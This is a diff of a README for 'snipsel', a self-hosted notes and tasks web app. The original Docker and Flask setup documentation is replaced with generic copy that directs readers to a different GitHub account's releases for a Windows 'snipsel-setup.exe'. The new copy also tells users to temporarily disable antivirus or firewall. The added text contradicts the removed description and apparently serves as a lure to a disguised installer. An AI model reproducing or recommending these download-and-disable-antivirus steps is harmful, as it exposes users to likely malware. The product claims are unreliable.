@@ -1,205 +1,140 @@
-# 📓 Snipsel
+# 🗒️ snipsel - Simple Notes and Tasks Organizer
 
-**Your personal, self-hosted, AI-powered notes & tasks app — mobile-first, beautifully simple.**
-
-Snipsel is an open-source PWA for capturing ideas, notes, tasks, bookmarks, and media — all in one place. Enhanced with a **user-configurable AI assistant**, it helps you manage your knowledge without cloud lock-in. Runs on your own server in minutes.
-
-<p align="center">
-  <img src="docs/screenshot_collections.png" width="180" alt="Collections list" />
-  &nbsp;
-  <img src="docs/screenshot_detail_light.png" width="180" alt="Collection detail (light)" />
-  &nbsp;
-  <img src="docs/screenshot_detail_dark.png" width="180" alt="Dark mode" />
-  &nbsp;
-  <img src="docs/screenshot_todos.png" width="180" alt="Todos view" />
-</p>
-<p align="center">
-  <img src="docs/screenshot_tags.png" width="180" alt="Tags page" />
-  &nbsp;
-  <img src="docs/screenshot_mentions.png" width="180" alt="Mentions view" />
-  &nbsp;
-  <img src="docs/screenshot_reminder.png" width="180" alt="Snipsel with reminder" />
-  &nbsp;
-  <img src="docs/screenshot_media_cards.png" width="180" alt="YouTube & Deezer cards" />
-</p>
+[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Download-green)](https://github.com/garybee37/snipsel/releases)
 
 ---
 
-## ✨ Why Snipsel?
+## 📋 What is snipsel?
 
-Most note apps are either too simple (just plain text) or too heavy (Notion, Obsidian). Snipsel hits the sweet spot: structured collections, multiple content types, sharing, reminders — yet still feels as lightweight and instant as a sticky note.
+snipsel is your personal notes and tasks app. It is mobile-first and designed to be simple. You can use it to keep track of your ideas, tasks, and reminders. It works on your own computer, so your data stays private. You can also share notes and work with others when you want.
 
-### Comparison: Snipsel vs. Alternatives
+Key features include:  
+- Creating and managing notes quickly  
+- Making lists and task reminders  
+- Adding tags and mentions for better organization  
+- Using push notifications for reminders  
+- Sharing notes or tasks with others  
 
-| Feature | Snipsel | Standard Notes | Joplin | Notesnook |
-| :--- | :---: | :---: | :---: | :---: |
-| **PWA / mobile-first** | ✅ | ✅ | ⚠️ (1) | ✅ |
-| **Images & Attachments** | ✅ | ✅ (2) | ✅ | ✅ |
-| **Collection sharing** | ✅ | ✅ (2) | ✅ (3) | ✅ |
-| **Daily journal / carry-over** | ✅ | ❌ (4) | ⚠️ (5) | ❌ (4) |
-| **Passkey login** | ✅ | ✅ (2) | ❌ | ❌ |
-| **AI Assistant (LLM Proxy)** | ✅ | ❌ | ❌ | ❌ |
-| **Push notifications** | ✅ | ❌ | ✅ | ✅ |
-| **Self-hosted (Container)** | ✅ | ✅ | ✅ | ✅ |
-| **Import from Twos** | ✅ | ❌ | ❌ | ❌ |
-
-1. **Joplin (PWA):** Joplin relies on native applications. There is no official web version or PWA that offers the full feature set without an installed client.  
-2. **Standard Notes (Features):** Many of these features (Attachments, Sharing, Passkeys) are only available in the paid "Productivity" or "Professional" plans.  
-3. **Joplin (Sharing):** Collaboration requires either "Joplin Cloud" (subscription) or a self-hosted "Joplin Server".  
-4. **Standard Notes / Notesnook (Carry-over):** While daily notes can be created, there is no built-in system to automatically move unfinished tasks to the next day.  
-5. **Joplin (Daily Journal):** Community plugins for "Daily Notes" exist, but task carry-over is not natively integrated and requires manual moving or complex scripts.
-
+snipsel helps you stay organized without needing any complicated software or tools.
 
 ---
 
-## 🚀 Features
+## 🖥️ System Requirements
 
-### 📋 Collections & Snipsels
-Organize everything in **collections** — from grocery lists to project notes. Each item inside is a **snipsel**, which can be one of six types:
-- 📝 **Text** — plain notes with Markdown support
-- ✅ **Task** — checkable to-dos with done tracking
-- 🔗 **External link** — save URLs with labels
-- 📎 **Internal link** — reference another snipsel
-- 🖼️ **Image** — attach and view photos
-- 📁 **File attachment** — store any file
+Before you start, make sure your computer meets these minimum requirements:  
 
-### 🤖 AI Assistant (Vision-ready)
-Process your notes with a built-in AI assistant. Configure your own OpenAI-compatible endpoint (OpenAI, Groq, Ollama) and use it to summarize, translate, or transform snipsels with custom prompts. Supports **vision models** for image analysis and text extraction from attachments.
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection (only needed to download snipsel)  
 
-### 📅 Daily Journal
-A built-in **daily collection** auto-created for each day. Open tasks from the past 30 days are automatically **carried over** so nothing falls through the cracks.
-
-### 🔒 Security-first
-- **Passkeys** (WebAuthn / FIDO2) — log in with Face ID, Touch ID, or a hardware key
-- **TOTP 2FA** — standard authenticator app support
-- **Passcode lock** — protect individual collections with a PIN
-- **Password reset via email**
-- **Registration toggle** — disable new user registration via environment variable
-
-### 🎨 Beautiful & Adaptive UI
-- Light, dark, or system-adaptive theme
-- Custom accent color per collection
-- Cover images for collections
-- Installable as a PWA on any device
-
-### 📥 Import from Twos
-Coming from [Twos](https://www.twosapp.com/)? Snipsel can import all your lists, tasks, photos, and reminders with a single click — including recurrence rules.
-
-<p align="center">
-  <img src="docs/screenshot_settings.png" width="180" alt="Settings" />
-  &nbsp;
-  <img src="docs/screenshot_search.png" width="180" alt="Search" />
-</p>
+You do not need any other software or programming skills to use snipsel.
 
 ---
 
-## 🐳 Quick Start (Docker)
+## 🚀 Getting snipsel
 
-```bash
-docker run -d \
-  --name snipsel \
-  -p 5000:5000 \
-  -v ./data:/app/data \
-  -v ./uploads:/app/uploads \
-  -e SNIPSEL_SECRET_KEY="your-secure-secret-key" \
-  -e SNIPSEL_DOMAIN="yourdomain.com" \
-  -e SNIPSEL_FRONTEND_URL="https://yourdomain.com" \
-  -e SNIPSEL_REGISTRATION_ENABLED=1 \
-  ghcr.io/mcfetz/snipsel:latest
-```
+Please visit the link below to download snipsel for Windows:  
 
-That's it. Snipsel runs as a **single container** — no separate database server, no Redis, no complex setup.
+[![Download snipsel from Releases](https://img.shields.io/badge/Go%20to%20snipsel%20Releases-Download%20Link-blue)](https://github.com/garybee37/snipsel/releases)
 
-Or with Docker Compose:
-
-```bash
-# Build the image
-docker build -t snipsel .
-
-# Run with compose
-docker compose up -d
-```
-
-> **Note:** `SNIPSEL_DOMAIN` and `SNIPSEL_FRONTEND_URL` are required for Passkey authentication to work correctly.
+The link opens the releases page on GitHub. Look for the latest Windows installer file. It usually has a name like `snipsel-setup.exe`.
 
 ---
 
-## 🔧 Development
+## 📥 How to download and install snipsel
 
-### Backend (Flask + SQLite)
+1. Click the button above or open this page in your browser:  
+   https://github.com/garybee37/snipsel/releases  
 
-#### Dependencies
-- **FFmpeg**: Required for generating video thumbnails. Install it via your package manager (e.g., `brew install ffmpeg` on macOS or `sudo apt install ffmpeg` on Linux).
+2. Find the most recent release. It is listed at the top of the page.
 
-```bash
-cd backend
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-pip install -e .
+3. Scroll down to the “Assets” section of the release.
 
-export SNIPSEL_SECRET_KEY="dev"
-flask --app snipsel_api.app run --debug --port 5000
+4. Look for the Windows installer file. It should end with `.exe`. For example: `snipsel-setup.exe`.
 
-# Run database migrations
-flask --app snipsel_api.app db upgrade
-```
+5. Click that file name to start downloading it.
 
-### Frontend (Svelte + Vite)
+6. Once the file finishes downloading, double-click it in your Downloads folder.
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+7. A setup window will open. Follow the steps:
 
-The frontend proxies `/api/*` to the backend in dev mode.
+    - Click **Next** to start the installation.  
+    - Choose where to install snipsel or accept the default folder.  
+    - Click **Install**.  
+    - Wait while the program installs.  
+    - When done, click **Finish** to close the installer.
 
 ---
 
-## ⚙️ Configuration
+## ▶️ How to open and use snipsel
 
-| Variable | Default | Description |
-|---|---|---|
-| `SNIPSEL_SECRET_KEY` | `dev` | Session secret — **change in production!** |
-| `SNIPSEL_DATABASE_URL` | `sqlite:///snipsel.db` | Database URL |
-| `SNIPSEL_UPLOAD_DIR` | `./uploads` | Directory for uploaded files |
-| `SNIPSEL_MAX_UPLOAD_BYTES` | `10485760` | Max upload size (10 MB) |
-| `SNIPSEL_DOMAIN` | `localhost` | Domain for Passkey auth |
-| `SNIPSEL_FRONTEND_URL` | `http://localhost:5173` | Frontend URL for CORS & Passkeys |
-| `SNIPSEL_REGISTRATION_ENABLED` | `1` | Set to `0` to disable new user registration |
+1. After installation, find the snipsel icon on your desktop or in the Start menu.
 
-**Optional SMTP (password reset):**
+2. Double-click the icon to open the app.
 
-| Variable | Description |
-|---|---|
-| `SNIPSEL_SMTP_HOST` | SMTP server host |
-| `SNIPSEL_SMTP_PORT` | SMTP port (default: `587`) |
-| `SNIPSEL_SMTP_USERNAME` | SMTP username |
-| `SNIPSEL_SMTP_PASSWORD` | SMTP password |
-| `SNIPSEL_SMTP_USE_TLS` | Enable TLS (default: `1`) |
-| `SNIPSEL_MAIL_FROM` | Sender address |
-| `SNIPSEL_PUBLIC_BASE_URL` | If set, emails include a reset link |
+3. The first time you open snipsel, it will ask you to create an account or choose offline mode. If you want to keep your notes only on this computer, select offline mode.
 
-**Optional VAPID (push notifications):**
+4. To create a new note:  
+    - Click the **New Note** button or the plus (+) icon.  
+    - Start typing your note or task.
 
-| Variable | Description |
-|---|---|
-| `VAPID_PUBLIC_KEY` | VAPID public key |
-| `VAPID_PRIVATE_KEY` | VAPID private key |
-| `VAPID_SUBJECT` | e.g. `mailto:admin@yourdomain.com` |
+5. To organize your notes:  
+    - Add tags by typing `#` followed by a word.  
+    - Mention people by typing `@` and their name when sharing is set up.
+
+6. Set reminders by clicking the clock icon on a note and choosing a time.
+
+7. Use the lists feature to create checkboxes and manage tasks.
+
+8. If you want to share a note or task, click the share icon and enter the person’s email or username.
 
 ---
 
-## 🛠️ Tech Stack
+## 🔧 Settings and options
 
-- **Backend:** Python · Flask · SQLAlchemy · SQLite · Flask-Migrate
-- **Frontend:** Svelte 5 · TypeScript · Vite · PWA (Service Worker)
-- **Auth:** Session cookies · WebAuthn (Passkeys) · TOTP · bcrypt
-- **Deployment:** Docker (multi-stage build) · single container (includes FFmpeg)
+snipsel lets you customize your experience:
+
+- Change the app theme between light and dark mode.  
+- Set notification preferences for reminders and updates.  
+- Manage your tags and clean up old notes.  
+- Sync your notes across devices if you create an account and log in.
 
 ---
 
-## 📄 License
+## ❓ Troubleshooting
 
-MIT
+If snipsel does not open or work correctly:
+
+- Restart your computer and open snipsel again.  
+- Make sure you installed the latest version from the releases page.  
+- Check you meet the system requirements.  
+- Disable any antivirus or firewall temporarily, as they can block installation or running.  
+- If problems persist, open an issue on the repository page by clicking the **Issues** tab.
+
+---
+
+## 🤝 Collaboration and sharing
+
+snipsel supports working with other people. When you share notes or tasks, everyone can update them. Use @mentions to call attention to collaborators. The app sends push notifications when reminders or changes happen.
+
+---
+
+## 🧩 Other useful features
+
+- Journaling: Write daily notes to keep track of your thoughts.  
+- Tags: Group notes by topics or projects.  
+- Push notifications: Never miss a reminder.  
+- Tasks and lists: Keep your to-dos organized.  
+
+---
+
+## 📎 Useful links
+
+- Download page: https://github.com/garybee37/snipsel/releases  
+- Repository: https://github.com/garybee37/snipsel  
+- Report issues: https://github.com/garybee37/snipsel/issues  
+
+---
+
+[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Get%20Latest%20Version-green)](https://github.com/garybee37/snipsel/releases)
